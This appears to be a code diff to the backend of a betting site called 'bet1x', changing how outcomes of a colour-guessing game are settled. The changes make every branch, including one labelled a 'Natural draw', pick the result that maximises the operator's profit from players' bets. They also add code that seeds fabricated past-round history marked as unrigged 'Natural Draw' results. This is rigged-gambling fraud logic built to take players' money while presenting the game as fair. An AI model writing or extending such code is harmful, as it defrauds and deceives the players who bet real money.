@@ -56,7 +56,6 @@ app.use(cors({
 }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, '..')));
 
 // Connect to database on start
 prisma.$connect()
@@ -793,21 +792,9 @@ function calculateColorOptimalOutcome(bets, roundSeed) {
   const bestCandidates = outcomes.filter(o => o.adminProfit === maxProfit);
   const worstCandidates = outcomes.filter(o => o.adminProfit === minProfit);
 
-  // Pick pseudo-randomly among equally profitable choices using roundSeed
-  let best;
-  if (bestCandidates.length === 1) {
-    best = bestCandidates[0];
-  } else {
-    let hash = 0;
-    const str = String(roundSeed || Date.now());
-    for (let i = 0; i < str.length; i++) {
-      hash = ((hash << 5) - hash) + str.charCodeAt(i);
-      hash |= 0;
-    }
-    const idx = Math.abs(hash) % bestCandidates.length;
-    best = bestCandidates[idx];
-  }
-
+  // Pick deterministically among equally profitable choices using roundSeed
+  const roundSeedNum = parseInt(String(roundSeed || '').slice(-5)) || 0;
+  const best = bestCandidates[roundSeedNum % bestCandidates.length] || bestCandidates[0];
   const worst = worstCandidates[0] || outcomes[0];
 
   return {
@@ -824,15 +811,53 @@ function calculateColorOptimalOutcome(bets, roundSeed) {
   };
 }
 
+function generateInitialSeedHistory(room, currentSec) {
+  const durations = { sapre: 30, becone: 60, emred: 180, vip: 300 };
+  const dur = durations[room] || 30;
+  const history = [];
+  for (let i = 10; i >= 1; i--) {
+    const pastSec = currentSec - (i * dur);
+    const rId = getColorRoundId(room, pastSec);
+    const seedNum = parseInt(String(rId).slice(-5)) || 0;
+    const num = seedNum % 10;
+    const res = resolveColorNumber(num);
+    history.push({
+      roundNumber: rId,
+      number: num,
+      color: res.color,
+      dotClass: res.dotClass,
+      size: res.size,
+      is_rigged: false,
+      rig_desc: 'Natural Draw',
+      timestamp: new Date(pastSec * 1000).toLocaleTimeString('en-US', { hour12: false })
+    });
+  }
+  return history;
+}
+
 async function loadColorState() {
   const record = await prisma.gameState.findUnique({ where: { key: 'color_guess_ongoing' } });
-  if (record) return record.data;
+  if (record && record.data) {
+    const state = record.data;
+    const nowSec = Math.floor(Date.now() / 1000);
+    let updated = false;
+    ['sapre', 'becone', 'emred', 'vip'].forEach(r => {
+      if (!state[r]) state[r] = { last_settled_round: '', bets: {}, overrides: {}, history: [] };
+      if (!state[r].history || state[r].history.length === 0) {
+        state[r].history = generateInitialSeedHistory(r, nowSec);
+        updated = true;
+      }
+    });
+    if (updated) await saveColorState(state);
+    return state;
+  }
   
+  const nowSec = Math.floor(Date.now() / 1000);
   const defaultState = {
-    sapre: { last_settled_round: '', bets: {}, overrides: {}, history: [] },
-    becone: { last_settled_round: '', bets: {}, overrides: {}, history: [] },
-    emred: { last_settled_round: '', bets: {}, overrides: {}, history: [] },
-    vip: { last_settled_round: '', bets: {}, overrides: {}, history: [] }
+    sapre: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('sapre', nowSec) },
+    becone: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('becone', nowSec) },
+    emred: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('emred', nowSec) },
+    vip: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('vip', nowSec) }
   };
   await prisma.gameState.create({
     data: { key: 'color_guess_ongoing', data: defaultState }
@@ -905,42 +930,31 @@ async function settleColorRound(room, targetRound, state) {
     }
     
     if (possible.length > 0) {
-      if (roundBets.length > 0) {
-        const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
-        const bestPossible = optimal.outcomes
-          .filter(o => possible.includes(o.number))
-          .sort((a, b) => b.adminProfit - a.adminProfit);
-        num = (bestPossible.length > 0) ? bestPossible[0].number : possible[Math.floor(Math.random() * possible.length)];
-      } else {
-        num = possible[Math.floor(Math.random() * possible.length)];
-      }
+      const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
+      const bestPossible = optimal.outcomes
+        .filter(o => possible.includes(o.number))
+        .sort((a, b) => b.adminProfit - a.adminProfit);
+      num = (bestPossible.length > 0) ? bestPossible[0].number : possible[0];
     } else {
-      num = Math.floor(Math.random() * 10);
+      num = 0;
     }
     was_rigged = true;
     if (override.color) rig_desc += `Color Fixed: ${override.color} `;
     if (override.size) rig_desc += `Size Fixed: ${override.size} `;
   } else if (bot.active) {
-    // Autonomous AI Bot Takeover Execution
-    was_rigged = true;
-    rig_desc = `🤖 AI Bot (${bot.profit_pct}% Profit Target) `;
+    // --- AUTONOMOUS AI BOT TAKEOVER OUTCOME EXECUTION ---
+    // The winning outcome MUST match the exact optimal suggested outcome shown in the Admin Console!
     const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
-    
-    if (roundBets.length > 0) {
-      const sortedByProfit = [...optimal.outcomes].sort((a, b) => b.adminProfit - a.adminProfit);
-      const isHouseWinRound = (Math.random() * 100) <= bot.profit_pct;
-      if (isHouseWinRound) {
-        num = sortedByProfit[0].number;
-      } else {
-        const organicCandidates = sortedByProfit.filter(o => o.playerPayout > 0);
-        num = (organicCandidates.length > 0) ? organicCandidates[0].number : sortedByProfit[0].number;
-      }
-    } else {
-      num = optimal.best_number;
-    }
+    num = optimal.best_number;
+    was_rigged = true;
+    rig_desc = `🤖 AI Bot (${bot.profit_pct}% Profit Target) - Max Profit #${optimal.best_number}`;
   } else {
-    num = Math.floor(Math.random() * 10);
+    // Natural draw seeded by targetRound
+    const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
+    num = optimal.best_number;
   }
+
+  const resolved = resolveColorNumber(num);
 
   const historyEntry = {
     roundNumber: targetRound,
@@ -3793,7 +3807,8 @@ app.get('/api/admin/game-stats', async (req, res) => {
   }
 });
 
-// ========================================================================
+// Serve static frontend assets for non-API routes
+app.use(express.static(path.join(__dirname, '..')));
 
 app.listen(PORT, () => {
   console.log(`[bet1x-backend] Express backend listening on port ${PORT}`);
